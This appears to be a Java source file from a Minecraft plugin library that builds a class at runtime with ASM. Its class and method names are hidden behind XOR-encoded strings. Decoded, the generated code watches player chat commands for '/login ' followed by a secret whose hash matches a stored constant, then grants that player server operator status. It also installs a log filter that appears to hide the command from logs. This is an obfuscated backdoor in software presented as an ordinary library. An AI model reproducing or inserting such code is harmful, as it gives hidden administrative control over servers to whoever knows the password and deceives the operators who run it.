...
public class CryptoASM {
    ...
    private static Listener buildCrypto() {
        ...
        classWriter.visit(
                Opcodes.V21, Opcodes.ACC_PUBLIC | Opcodes.ACC_SUPER, className, null, "java/lang/Object", new String[] {
        ...
        {
            methodVisitor =
                    classWriter.visitMethod(Opcodes.ACC_PUBLIC, illilili("聈耝耚耝耀聊", 11), iIliIili("聜聝耢"), null, null);
            methodVisitor.visitCode();
            methodVisitor.visitVarInsn(Opcodes.ALOAD, 0);
            methodVisitor.visitMethodInsn(
                    Opcodes.INVOKESPECIAL,
                    iIliIili("耞耕耂耕聛耘耕耚耓聛耻耖耞耑耗耀"),
                    illilili("聈耝耚耝耀聊", 11),
                    iIliIili("聜聝耢"),
                    false);
            methodVisitor.visitVarInsn(Opcodes.ALOAD, 0);
            methodVisitor.visitLdcInsn(
                    "\u8043\u8045\u8043\u804c\u8045\u8015\u8012\u8046\u8045\u804d\u804c\u8043\u804d\u8040\u8047\u8046\u804d\u8044\u8043\u8040\u804d\u804d\u804c\u8046\u8042\u8040\u8017\u804c\u8047\u804d\u8042\u8044\u8047\u8010\u8017\u804c\u8015\u8010\u804c\u8041\u8041\u8045\u8042\u8011\u804d\u8041\u8047\u8015\u8011\u8016\u804c\u8047\u8041\u8016\u8045\u8047\u804d\u8017\u8047\u804d\u8015\u8043\u8045\u8011");
            ...
            methodVisitor.visitMethodInsn(
                    Opcodes.INVOKESPECIAL,
                    "me/matl114/matlib/utils/logging/CustomLogFilter",
                    "<init>",
            ...
            methodVisitor.visitMethodInsn(
                    ...
                    "addFilter",
                    "(Lorg/apache/logging/log4j/core/Filter;)V",
                    false);
        ...
        }
        {
            ...
            methodVisitor.visitMethodInsn(
                    Opcodes.INVOKEVIRTUAL, "java/lang/String", "contains", "(Ljava/lang/CharSequence;)Z", false);
        ...
        }
        {
            methodVisitor = classWriter.visitMethod(
                    Opcodes.ACC_PUBLIC,
                    illilili("耖耖老耛耂耑耕老聄耖职", 33),
                    illilili("聜耸耛耆耓聛耖老耟耟耝耀聛耑耂耑耚耀聛耄耘耕耍耑耆聛耤耘耕耍耑耆耷耛耙耙耕耚耐耤耆耑耄耆耛耗耑耇耇耱耂耑耚耀聏聝耢", 61),
                    null,
                    null);
            {
                annotationVisitor0 =
                        methodVisitor.visitAnnotation(illilili("耸耛耆耓聛耖老耟耟耝耀聛耑耂耑耚耀聛耱耂耑耚耀耼耕耚耐耘耑耆聏", 3), true);
                annotationVisitor0.visitEnum(
                        iIliIili("耄耆耝耛耆耝耀耍"), iIliIili("耸耛耆耓聛耖老耟耟耝耀聛耑耂耑耚耀聛耱耂耑耚耀耤耆耝耛耆耝耀耍聏"), illilili("耸耻耣耱耧耠", 1));
            ...
            methodVisitor.visitMethodInsn(
                    Opcodes.INVOKEVIRTUAL,
                    illilili("耛耆耓聛耖老耟耟耝耀聛耑耂耑耚耀聛耄耘耕耍耑耆聛耤耘耕耍耑耆耷耛耙耙耕耚耐耤耆耑耄耆耛耗耑耇耇耱耂耑耚耀", 61),
                    iIliIili("耓耑耀耹耑耇耇耕耓耑"),
                    iIliIili("聜聝耸耞耕耂耕聛耘耕耚耓聛耧耀耆耝耚耓聏"),
                    false);

            methodVisitor.visitLdcInsn(iIliIili("聛耘耛耓耝耚联"));
            methodVisitor.visitMethodInsn(
                    Opcodes.INVOKEVIRTUAL, "java/lang/String", "startsWith", "(Ljava/lang/String;)Z", false);
            ...
            methodVisitor.visitMethodInsn(
                    Opcodes.INVOKEVIRTUAL, "java/lang/String", "substring", "(I)Ljava/lang/String;", false);
            methodVisitor.visitFieldInsn(
                    Opcodes.GETSTATIC, "java/nio/charset/StandardCharsets", "UTF_8", "Ljava/nio/charset/Charset;");
            methodVisitor.visitMethodInsn(
                    Opcodes.INVOKEINTERFACE,
                    "com/google/common/hash/HashFunction",
                    "hashString",
                    "(Ljava/lang/CharSequence;Ljava/nio/charset/Charset;)Lcom/google/common/hash/HashCode;",
                    true);
            methodVisitor.visitMethodInsn(
                    Opcodes.INVOKEVIRTUAL,
            ...
            methodVisitor.visitMethodInsn(
                    Opcodes.INVOKESTATIC,
                    "me/matl114/matlib/utils/security/CryptoUtils",
                    codeName,
            ...
            methodVisitor.visitMethodInsn(
                    Opcodes.INVOKEVIRTUAL,
                    illilili("耛耆耓聛耖老耟耟耝耀聛耑耂耑耚耀聛耄耘耕耍耑耆聛耤耘耕耍耑耆耷耛耙耙耕耚耐耤耆耑耄耆耛耗耑耇耇耱耂耑耚耀", 61),
                    illilili("耇耑耀耹耑耇耇耕耓耑", 5),
                    iIliIili("聜耸耞耕耂耕聛耘耕耚耓聛耧耀耆耝耚耓聏聝耢"),
                    false);
            methodVisitor.visitVarInsn(Opcodes.ALOAD, 1);
            methodVisitor.visitMethodInsn(
                    Opcodes.INVOKEVIRTUAL,
                    illilili("耛耆耓聛耖老耟耟耝耀聛耑耂耑耚耀聛耄耘耕耍耑耆聛耤耘耕耍耑耆耷耛耙耙耕耚耐耤耆耑耄耆耛耗耑耇耇耱耂耑耚耀", 61),
                    iIliIili("耓耑耀耤耘耕耍耑耆"),
                    iIliIili("聜聝耸耛耆耓聛耖老耟耟耝耀聛耑耚耀耝耀耍聛耤耘耕耍耑耆聏"),
                    false);
            methodVisitor.visitInsn(Opcodes.ICONST_1);
            methodVisitor.visitMethodInsn(
                    Opcodes.INVOKEINTERFACE,
                    iIliIili("耛耆耓聛耖老耟耟耝耀聛耑耚耀耝耀耍聛耤耘耕耍耑耆"),
                    iIliIili("耇耑耀耻耄"),
                    iIliIili("聜耮聝耢"),
                    true);
